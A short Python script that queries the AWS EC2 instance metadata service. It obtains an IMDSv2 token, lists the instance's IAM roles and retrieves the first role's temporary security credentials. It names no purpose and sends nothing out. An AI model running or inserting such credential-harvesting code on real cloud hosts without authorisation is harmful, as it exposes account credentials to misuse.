import urllib.request
try:
    req = urllib.request.Request("http://169.254.169.254/latest/api/token")
    req.add_header("X-aws-ec2-metadata-token-ttl-seconds", "60")
    req.method = "PUT"
    token = urllib.request.urlopen(req).read().decode()
    
    req2 = urllib.request.Request("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    req2.add_header("X-aws-ec2-metadata-token", token)
    roles = urllib.request.urlopen(req2).read().decode()
    print("Roles found:", roles)
    
    if roles.strip():
        role_name = roles.strip().split("\n")[0]
        req3 = urllib.request.Request(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}")
        req3.add_header("X-aws-ec2-metadata-token", token)
        creds = urllib.request.urlopen(req3).read().decode()
        print("Credentials info loaded successfully.")
except Exception as e:
    print("Error:", e)
